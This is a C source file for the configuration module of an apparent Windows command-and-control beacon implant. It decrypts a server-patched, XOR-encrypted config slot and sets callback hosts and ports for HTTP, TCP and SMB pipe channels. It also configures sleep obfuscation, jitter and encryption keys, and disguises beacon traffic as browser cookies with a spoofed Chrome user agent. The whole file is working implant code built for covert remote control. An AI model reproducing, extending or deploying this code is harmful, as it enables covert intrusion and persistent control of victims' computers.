#include "beacon_profile.h"

#include <windows.h>

/*
 * Profile 模块负责装载运行时配置。
 * 默认值用于 DebugExe；发布构建优先从可 patch 的 TSCF 配置槽读取 TLV。
 */

#define PROFILE_PATCH_SLOT_SIZE 4096u
#define PROFILE_PATCH_VERSION 2u
#define PROFILE_PATCH_FLAG_XOR 0x0001u
#define PROFILE_PATCH_KEY_SIZE 32u
#define PROFILE_PATCH_HEADER_SIZE (16u + PROFILE_PATCH_KEY_SIZE)

#define CFG_LISTENER_NAME 1u
#define CFG_LISTENER_TYPE 2u
#define CFG_PROTOCOL 3u
#define CFG_FORMAT 4u
#define CFG_SLEEP_TIME 5u
#define CFG_JITTER 6u
#define CFG_SLEEP_OBF_ENABLED 7u
#define CFG_SLEEP_OBF_TECHNIQUE 8u
#define CFG_SLEEP_IMAGE_LAYOUT 300u
#define CFG_HTTP_HOST 100u
#define CFG_HTTP_PORT 101u
#define CFG_HTTP_URI 102u
#define CFG_HTTP_RECONNECT_COUNT 103u
#define CFG_HTTP_RECONNECT_TIME 104u
#define CFG_HTTP_SSL 105u
#define CFG_HTTP_METHOD 106u
#define CFG_HTTP_RESPONSE_HEADERS 107u
#define CFG_HTTP_ENCRYPT_KEY 110u
#define CFG_HTTP_HOST_HEADER 111u
#define CFG_HTTP_USER_AGENT 112u
#define CFG_HTTP_X_FORWARDED_FOR 113u
#define CFG_HTTP_SSL_CERT 114u
#define CFG_HTTP_SSL_KEY 115u
#define CFG_HTTP_CALLBACK_HOST 116u
#define CFG_HTTP_TRANSFORM 117u
#define CFG_TCP_BIND_HOST 200u
#define CFG_TCP_BIND_PORT 201u
#define CFG_TCP_CONNECT_TIMEOUT 202u
#define CFG_TCP_CALLBACK_HOST 220u
#define CFG_TCP_CALLBACK_PORT 221u
#define CFG_TCP_RECONNECT_COUNT 222u
#define CFG_TCP_RECONNECT_TIME 223u
#define CFG_TCP_SSL 224u
#define CFG_TCP_ENCRYPT_KEY 225u
#define CFG_SMB_PIPE_NAME 210u
#define CFG_SMB_CONNECT_TIMEOUT 211u

#define CFG_VALUE_BYTES 1u
#define HTTP_TRANSFORM_VERSION 1u
#define HTTP_TRANSFORM_LOC_BODY 1u
#define HTTP_TRANSFORM_LOC_HEADER 2u
#define HTTP_TRANSFORM_ENC_RAW 1u
#define HTTP_TRANSFORM_ENC_BASE64 2u
#define HTTP_TRANSFORM_OUT_BINARY 1u
#define HTTP_TRANSFORM_OUT_PRINT 2u

/* 运行时可修补的配置槽（由 server 端 TSCF 写入） */
__declspec(align(16)) BYTE8 g_BeaconProfilePatchSlot[PROFILE_PATCH_SLOT_SIZE] = {
    0x8d, 0x71, 0x2f, 0xa4, 0x19, 0xc0, 0x46, 0x5e,
    0x93, 0x7b, 0x2a, 0xd8, 0x60, 0x1f, 0xb5, 0x0c
};

typedef struct ProfilePatchTarget {
    CHAR http_host[256];
    CHAR callback_host[256];
    INT port;
    INT has_port;
} ProfilePatchTarget;

/* 计算 CRC-32 校验和 */
static UINT32 ProfileCrc32(const BYTE8* data, SIZE_T len)
{
    UINT32 crc = 0xffffffffu;
    SIZE_T i;

    for (i = 0; i < len; ++i) {
        INT bit;
        crc ^= data[i];
        for (bit = 0; bit < 8; ++bit) {
            crc = (crc & 1u) ? ((crc >> 1) ^ 0xedb88320u) : (crc >> 1);
        }
    }

    return crc ^ 0xffffffffu;
}

/* 使用 32 字节循环 XOR key 解密/加密配置数据 */
static VOID XorProfileConfig(BYTE8* out, const BYTE8* in, UINT32 len, const BYTE8* key)
{
    UINT32 i;

    if (!out || !in || !key) return;

    for (i = 0; i < len; ++i) {
        out[i] = in[i] ^ key[i % PROFILE_PATCH_KEY_SIZE];
    }
}

/* 从 TLV 值拷贝字符串到目标缓冲区（去除首尾空字节） */
static VOID CopyTlvString(CHAR* dst, SIZE_T dst_len, const BYTE8* value, UINT32 value_len)
{
    SIZE_T copy_len;

    if (!dst || dst_len == 0) return;

    while (value_len > 0 && value[0] == 0) {
        ++value;
        --value_len;
    }
    while (value_len > 0 && value[value_len - 1] == 0) {
        --value_len;
    }

    copy_len = (SIZE_T)value_len;
    if (copy_len >= dst_len) copy_len = dst_len - 1;

    ZeroMemory(dst, dst_len);
    if (copy_len) {
        memcpy(dst, value, copy_len);
    }
}

/* 检查主机字符串是否包含端口号 */
static INT HasHostPort(const CHAR* host)
{
    return host && strchr(host, ':') != NULL;
}

/* 从 URL 中提取主机名（去除协议前缀和路径） */
static VOID NormalizeHost(CHAR* dst, SIZE_T dst_len, const CHAR* src, INT* ssl)
{
    const CHAR* start = src;
    const CHAR* slash;
    SIZE_T len;

    if (!dst || dst_len == 0) return;
    ZeroMemory(dst, dst_len);
    if (!src || !src[0]) return;

    if (_strnicmp(start, "https://", 8) == 0) {
        start += 8;
        if (ssl) *ssl = 1;
    } else if (_strnicmp(start, "http://", 7) == 0) {
        start += 7;
        if (ssl) *ssl = 0;
    }

    slash = strchr(start, '/');
    len = slash ? (SIZE_T)(slash - start) : strlen(start);
    if (len >= dst_len) len = dst_len - 1;
    memcpy(dst, start, len);
    dst[len] = 0;
}

/* 将修补的目标地址应用到 Profile */
static VOID ApplyPatchedTarget(Profile* p, const ProfilePatchTarget* target)
{
    CHAR host[256];
    const CHAR* source;

    if (!p || !target) return;
    if (!target->callback_host[0] && !target->http_host[0] && !target->has_port) return;

    source = target->callback_host[0] ? target->callback_host : target->http_host;
    if (source[0]) {
        NormalizeHost(host, sizeof(host), source, &p->http.ssl);
    } else {
        strcpy_s(host, sizeof(host), p->http.target);
    }

    if (target->has_port && target->port > 0 && !HasHostPort(host)) {
        snprintf(p->http.target, sizeof(p->http.target), "%s:%d", host, target->port);
    } else {
        strcpy_s(p->http.target, sizeof(p->http.target), host);
    }
}

/* 确保 URI 以 '/' 开头 */
static VOID NormalizeUri(CHAR* uri, SIZE_T uri_len)
{
    SIZE_T len;

    if (!uri || uri_len < 2 || !uri[0] || uri[0] == '/') return;

    len = strlen(uri);
    if (len >= uri_len - 1) len = uri_len - 2;
    memmove(uri + 1, uri, len);
    uri[0] = '/';
    uri[len + 1] = 0;
}

/* 从固定 16 字节 TLV 中读取预计算映像布局 */
static VOID ApplySleepImageLayout(Profile* p, const BYTE8* value, UINT32 value_len)
{
    UINT32 image_size;
    UINT32 text_rva;
    UINT32 text_size;
    UINT32 text_protect;

    if (!p || !value || value_len != 16u) return;

    image_size = BeReadU32(value);
    text_rva = BeReadU32(value + 4);
    text_size = BeReadU32(value + 8);
    text_protect = BeReadU32(value + 12);

    if (image_size == 0 || text_size == 0 || text_rva >= image_size ||
        text_size > image_size - text_rva) {
        return;
    }

    p->sleep_layout.valid = TRUE;
    p->sleep_layout.image_size = image_size;
    p->sleep_layout.text_rva = text_rva;
    p->sleep_layout.text_size = text_size;
    p->sleep_layout.text_protect = text_protect ? text_protect : PAGE_EXECUTE_READ;
}

typedef struct TransformReader {
    const BYTE8* data;
    UINT32 len;
    UINT32 off;
} TransformReader;

static INT TransformReadU8(TransformReader* r, UINT8* out)
{
    if (!r || !out || r->off >= r->len) {
        return 0;
    }
    *out = r->data[r->off++];
    return 1;
}

static INT TransformReadU16Be(TransformReader* r, UINT16* out)
{
    if (!r || !out || r->len - r->off < 2u) {
        return 0;
    }
    *out = BeReadU16(r->data + r->off);
    r->off += 2u;
    return 1;
}

static INT TransformReadStringU16(TransformReader* r, CHAR* dst, SIZE_T dst_len)
{
    UINT16 len;
    SIZE_T copy_len;

    if (!r || !dst || dst_len == 0 || !TransformReadU16Be(r, &len)) {
        return 0;
    }
    if ((UINT32)len > r->len - r->off) {
        return 0;
    }

    ZeroMemory(dst, dst_len);
    copy_len = len;
    if (copy_len >= dst_len) {
        copy_len = dst_len - 1;
    }
    if (copy_len) {
        memcpy(dst, r->data + r->off, copy_len);
    }
    r->off += len;
    return 1;
}

static INT ParseHttpTransform(TransformReader* r, HttpDataTransform* out)
{
    if (!r || !out) {
        return 0;
    }

    ZeroMemory(out, sizeof(*out));
    if (!TransformReadU8(r, &out->present) ||
        !TransformReadU8(r, &out->location) ||
        !TransformReadU8(r, &out->encoding) ||
        !TransformReadU8(r, &out->output_mode) ||
        !TransformReadStringU16(r, out->name, sizeof(out->name)) ||
        !TransformReadStringU16(r, out->prefix, sizeof(out->prefix)) ||
        !TransformReadStringU16(r, out->suffix, sizeof(out->suffix))) {
        return 0;
    }

    return 1;
}

static INT ParseHttpMethodTransform(TransformReader* r, HttpMethodTransform* out)
{
    if (!r || !out) {
        return 0;
    }

    return ParseHttpTransform(r, &out->metadata) &&
           ParseHttpTransform(r, &out->stage_output) &&
           ParseHttpTransform(r, &out->server_output);
}

/* 解析 CfgHTTPTransform 的二进制 block。失败时保留 present=1，禁止静默回退旧协议。 */
static INT ParseHttpTransformBlock(HttpTransformConfig* out, const BYTE8* data, UINT32 data_len)
{
    TransformReader r;
    UINT16 version;

    if (!out || !data) {
        return 0;
    }

    ZeroMemory(out, sizeof(*out));
    out->present = 1;
    r.data = data;
    r.len = data_len;
    r.off = 0;

    if (!TransformReadU16Be(&r, &version) || version != HTTP_TRANSFORM_VERSION) {
        return 0;
    }
    out->version = version;

    if (!ParseHttpMethodTransform(&r, &out->get) ||
        !ParseHttpMethodTransform(&r, &out->post)) {
        return 0;
    }

    return r.off == r.len;
}

/* 解析 TLV 格式的配置数据并填充 Profile */
static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
{
    ProfilePatchTarget target;
    UINT32 offset = 0;

    ZeroMemory(&target, sizeof(target));

    while (offset + 8u <= data_len) {
        UINT16 tag = BeReadU16(data + offset);
        UINT8 value_type = data[offset + 2];
        UINT32 value_len = BeReadU32(data + offset + 4);
        const BYTE8* value;

        offset += 8u;
        if (value_len > data_len - offset) {
            return 0;
        }

        value = data + offset;
        offset += value_len;

        switch (tag) {
        case CFG_LISTENER_NAME:
            CopyTlvString(p->listener_name, sizeof(p->listener_name), value, value_len);
            break;
        case CFG_LISTENER_TYPE:
            CopyTlvString(p->listener_type, sizeof(p->listener_type), value, value_len);
            break;
        case CFG_PROTOCOL:
            CopyTlvString(p->protocol, sizeof(p->protocol), value, value_len);
            break;
        case CFG_FORMAT:
            CopyTlvString(p->format, sizeof(p->format), value, value_len);
            break;
        case CFG_SLEEP_TIME:
            if (value_len == 4) p->sleep_ms = (INT)BeReadU32(value);
            break;
        case CFG_JITTER:
            if (value_len == 4) p->jitter = (INT)BeReadU32(value);
            break;
        case CFG_SLEEP_OBF_ENABLED:
            if (value_len > 0) p->sleep_obf_enabled = value[0] != 0;
            break;
        case CFG_SLEEP_OBF_TECHNIQUE:
            if (value_len == 4) {
                p->sleep_obf_technique = (SleepObfTechnique)BeReadU32(value);
            } else if (value_len > 0) {
                p->sleep_obf_technique = (SleepObfTechnique)value[0];
            }
            break;
        case CFG_SLEEP_IMAGE_LAYOUT:
            ApplySleepImageLayout(p, value, value_len);
            break;
        case CFG_HTTP_HOST:
            CopyTlvString(target.http_host, sizeof(target.http_host), value, value_len);
            break;
        case CFG_HTTP_PORT:
            if (value_len == 4) {
                target.port = (INT)BeReadU32(value);
                target.has_port = 1;
            } else if (value_len == 2) {
                target.port = (INT)BeReadU16(value);
                target.has_port = 1;
            }
            break;
        case CFG_HTTP_CALLBACK_HOST:
            CopyTlvString(target.callback_host, sizeof(target.callback_host), value, value_len);
            break;
        case CFG_TCP_BIND_HOST:
            CopyTlvString(p->tcp_internal.bind_host, sizeof(p->tcp_internal.bind_host), value, value_len);
            break;
        case CFG_TCP_BIND_PORT:
            if (value_len == 4) p->tcp_internal.bind_port = (INT)BeReadU32(value);
            break;
        case CFG_TCP_CONNECT_TIMEOUT:
            if (value_len == 4) p->tcp_internal.connect_timeout_ms = (INT)BeReadU32(value);
            break;
        case CFG_SMB_PIPE_NAME:
            CopyTlvString(p->smb_internal.pipe_name, sizeof(p->smb_internal.pipe_name), value, value_len);
            break;
        case CFG_SMB_CONNECT_TIMEOUT:
            if (value_len == 4) p->smb_internal.connect_timeout_ms = (INT)BeReadU32(value);
            break;
        case CFG_HTTP_URI:
            CopyTlvString(p->http.uri, sizeof(p->http.uri), value, value_len);
            NormalizeUri(p->http.uri, sizeof(p->http.uri));
            break;
        case CFG_HTTP_RECONNECT_COUNT:
            if (value_len == 4) p->http.reconnect_count = (INT)BeReadU32(value);
            break;
        case CFG_HTTP_RECONNECT_TIME:
            if (value_len == 4) p->http.reconnect_time_ms = (INT)BeReadU32(value);
            break;
        case CFG_HTTP_SSL:
            if (value_len > 0) p->http.ssl = value[0] != 0;
            break;
        case CFG_HTTP_METHOD:
            CopyTlvString(p->http.method, sizeof(p->http.method), value, value_len);
            break;
        case CFG_HTTP_RESPONSE_HEADERS:
            CopyTlvString(p->http.response_headers, sizeof(p->http.response_headers), value, value_len);
            break;
        case CFG_HTTP_ENCRYPT_KEY:
            CopyTlvString(p->http.encrypt_key, sizeof(p->http.encrypt_key), value, value_len);
            CopyTlvString(p->encrypt_key, sizeof(p->encrypt_key), value, value_len);
            break;
        case CFG_HTTP_TRANSFORM:
            p->http.transform.present = 1;
            if (value_type == CFG_VALUE_BYTES) {
                ParseHttpTransformBlock(&p->http.transform, value, value_len);
            }
            break;
        case CFG_TCP_CALLBACK_HOST:
            CopyTlvString(p->tcp_external.callback_host, sizeof(p->tcp_external.callback_host), value, value_len);
            break;
        case CFG_TCP_CALLBACK_PORT:
            if (value_len == 4) p->tcp_external.callback_port = (INT)BeReadU32(value);
            break;
        case CFG_TCP_RECONNECT_COUNT:
            if (value_len == 4) p->tcp_external.reconnect_count = (INT)BeReadU32(value);
            break;
        case CFG_TCP_RECONNECT_TIME:
            if (value_len == 4) p->tcp_external.reconnect_time_ms = (INT)BeReadU32(value);
            break;
        case CFG_TCP_SSL:
            if (value_len > 0) p->tcp_external.ssl = value[0] != 0;
            break;
        case CFG_TCP_ENCRYPT_KEY:
            CopyTlvString(p->tcp_external.encrypt_key, sizeof(p->tcp_external.encrypt_key), value, value_len);
            CopyTlvString(p->encrypt_key, sizeof(p->encrypt_key), value, value_len);
            break;
        case CFG_HTTP_HOST_HEADER:
            CopyTlvString(p->http.host_header, sizeof(p->http.host_header), value, value_len);
            break;
        case CFG_HTTP_USER_AGENT:
            CopyTlvString(p->http.user_agent, sizeof(p->http.user_agent), value, value_len);
            break;
        case CFG_HTTP_X_FORWARDED_FOR:
            if (value_len > 0) p->http.x_forwarded_for = value[0] != 0;
            break;
        case CFG_HTTP_SSL_CERT:
            CopyTlvString(p->http.ssl_cert, sizeof(p->http.ssl_cert), value, value_len);
            break;
        case CFG_HTTP_SSL_KEY:
            CopyTlvString(p->http.ssl_key, sizeof(p->http.ssl_key), value, value_len);
            break;
        default:
            break;
        }
    }

    ApplyPatchedTarget(p, &target);
    return offset == data_len;
}

static VOID SetHttpTransform(HttpDataTransform* t,
                             UINT8 location,
                             UINT8 encoding,
                             UINT8 output_mode,
                             const CHAR* name,
                             const CHAR* prefix)
{
    ZeroMemory(t, sizeof(*t));
    t->present = 1;
    t->location = location;
    t->encoding = encoding;
    t->output_mode = output_mode;
    if (name && name[0]) {
        strcpy_s(t->name, sizeof(t->name), name);
    }
    if (prefix && prefix[0]) {
        strcpy_s(t->prefix, sizeof(t->prefix), prefix);
    }
}

/* DebugExe 默认 profile 与 TeamServer c2profile/http-default.yaml 保持一致。 */
static VOID SetDefaultHttpTransform(Profile* p)
{
    HttpTransformConfig* transform = &p->http.transform;

    ZeroMemory(transform, sizeof(*transform));
    transform->present = 1;
    transform->version = HTTP_TRANSFORM_VERSION;

    SetHttpTransform(&transform->get.metadata,
                     HTTP_TRANSFORM_LOC_HEADER,
                     HTTP_TRANSFORM_ENC_BASE64,
                     0,
                     "Cookie",
                     "SESSIONID=");
    SetHttpTransform(&transform->get.stage_output,
                     HTTP_TRANSFORM_LOC_BODY,
                     HTTP_TRANSFORM_ENC_RAW,
                     HTTP_TRANSFORM_OUT_BINARY,
                     NULL,
                     NULL);
    SetHttpTransform(&transform->get.server_output,
                     HTTP_TRANSFORM_LOC_BODY,
                     HTTP_TRANSFORM_ENC_RAW,
                     HTTP_TRANSFORM_OUT_BINARY,
                     NULL,
                     NULL);

    SetHttpTransform(&transform->post.metadata,
                     HTTP_TRANSFORM_LOC_HEADER,
                     HTTP_TRANSFORM_ENC_BASE64,
                     0,
                     "Cookie",
                     "JSESSION=");
    SetHttpTransform(&transform->post.stage_output,
                     HTTP_TRANSFORM_LOC_BODY,
                     HTTP_TRANSFORM_ENC_BASE64,
                     HTTP_TRANSFORM_OUT_PRINT,
                     NULL,
                     NULL);
    SetHttpTransform(&transform->post.server_output,
                     HTTP_TRANSFORM_LOC_BODY,
                     HTTP_TRANSFORM_ENC_BASE64,
                     HTTP_TRANSFORM_OUT_PRINT,
                     NULL,
                     NULL);
}

/* 从全局 patch slot 读取、解密并应用 TSCF v2 配置 */
static INT ApplyPatchedProfile(Profile* p)
{
    const BYTE8* slot = g_BeaconProfilePatchSlot;
    const BYTE8* key;
    const BYTE8* encrypted;
    BYTE8* plain = NULL;
    UINT16 version;
    UINT16 flags;
    UINT32 config_len;
    UINT32 expected_crc;
    UINT32 actual_crc;
    INT ok = 0;

    if (!p) {
        return 0;
    }

    if (slot[0] != 'T' || slot[1] != 'S' || slot[2] != 'C' || slot[3] != 'F') {
        return 0;
    }

    version = BeReadU16(slot + 4);
    if (version != PROFILE_PATCH_VERSION) {
        return 0;
    }

    flags = BeReadU16(slot + 6);
    if (flags != PROFILE_PATCH_FLAG_XOR) {
        return 0;
    }

    config_len = BeReadU32(slot + 8);
    if (config_len == 0 || config_len > PROFILE_PATCH_SLOT_SIZE - PROFILE_PATCH_HEADER_SIZE) {
        return 0;
    }

    expected_crc = BeReadU32(slot + 12);
    key = slot + 16;
    encrypted = slot + PROFILE_PATCH_HEADER_SIZE;

    plain = (BYTE8*)HeapAlloc(GetProcessHeap(), 0, config_len);
    if (!plain) {
        return 0;
    }

    XorProfileConfig(plain, encrypted, config_len, key);

    actual_crc = ProfileCrc32(plain, config_len);
    if (actual_crc != expected_crc) {
        goto cleanup;
    }

    ok = ParseProfileTlv(p, plain, config_len);

cleanup:
    SecureZeroMemory(plain, config_len);
    HeapFree(GetProcessHeap(), 0, plain);
    return ok;
}

/*
 * ProfileLoad - 使用默认 C2 连接参数填充配置。
 *   DebugExe 使用硬编码默认值；其他构建如果全局 patch slot 已由
 *   server 写入 TSCF 配置，则从 TLV 覆盖对应字段。
 */
VOID ProfileLoad(Profile* p)
{
    ZeroMemory(p, sizeof(*p));

    /* 时间默认值 */
    p->sleep_ms = 5000;
    p->jitter = 20;
    p->conn_timeout_sec = 10;
    //p->sleep_obf_enabled = TRUE;
    p->sleep_obf_enabled = FALSE;
    p->sleep_obf_technique = SLEEP_OBF_GARGLE;

    strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-http");
    strcpy_s(p->listener_type, sizeof(p->listener_type), "external");
    strcpy_s(p->protocol, sizeof(p->protocol), "http");
    strcpy_s(p->format, sizeof(p->format), "http");

    /* HTTP 传输配置 */
    strcpy_s(p->http.method, sizeof(p->http.method), "POST");
    strcpy_s(p->http.target, sizeof(p->http.target), "192.168.18.1:4444");
    strcpy_s(p->http.uri, sizeof(p->http.uri), "/index.php");
    strcpy_s(p->http.user_agent, sizeof(p->http.user_agent), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
    strcpy_s(p->http.content_type, sizeof(p->http.content_type), "application/octet-stream");
    strcpy_s(p->http.encrypt_key, sizeof(p->http.encrypt_key), "10edff51257a9c29e4cb8e36eb73fa3c");
    strcpy_s(p->encrypt_key, sizeof(p->encrypt_key), p->http.encrypt_key);
    SetDefaultHttpTransform(p);

    /* SSL 和重连策略 */
    p->http.ssl = 0;
    p->http.reconnect_count = 3;
    p->http.reconnect_time_ms = 3000;

    strcpy_s(p->tcp_external.callback_host, sizeof(p->tcp_external.callback_host), "192.168.18.1");
    p->tcp_external.callback_port = 9999;
    p->tcp_external.reconnect_count = 3;
    p->tcp_external.reconnect_time_ms = 3000;
    p->tcp_external.ssl = 1;
    strcpy_s(p->tcp_external.encrypt_key, sizeof(p->tcp_external.encrypt_key), "4d137aadf252d2f89dd46173ab54ef8f");

    strcpy_s(p->tcp_internal.bind_host, sizeof(p->tcp_internal.bind_host), "0.0.0.0");
    p->tcp_internal.bind_port = 4444;
    p->tcp_internal.connect_timeout_ms = 10000;

    strcpy_s(p->smb_internal.pipe_name, sizeof(p->smb_internal.pipe_name), "\\\\.\\pipe\\beacon_internal");
    p->smb_internal.connect_timeout_ms = 10000;

#if defined(BEACON_EXTERNAL_TCP_BUILD)
    strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-tcp-external");
    strcpy_s(p->listener_type, sizeof(p->listener_type), "external");
    strcpy_s(p->protocol, sizeof(p->protocol), "tcp");
    strcpy_s(p->format, sizeof(p->format), "tcp");
    strcpy_s(p->encrypt_key, sizeof(p->encrypt_key), p->tcp_external.encrypt_key);
#elif defined(BEACON_INTERNAL_TCP_BUILD)
    strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-tcp-internal");
    strcpy_s(p->listener_type, sizeof(p->listener_type), "internal");
    strcpy_s(p->protocol, sizeof(p->protocol), "tcp");
    strcpy_s(p->format, sizeof(p->format), "cascade");
#elif defined(BEACON_INTERNAL_SMB_BUILD)
    strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-smb-internal");
    strcpy_s(p->listener_type, sizeof(p->listener_type), "internal");
    strcpy_s(p->protocol, sizeof(p->protocol), "smb");
    strcpy_s(p->format, sizeof(p->format), "cascade");
#endif

#if !(defined(_DEBUG) && defined(BEACON_EXE_BUILD))
    ApplyPatchedProfile(p);
#endif
}
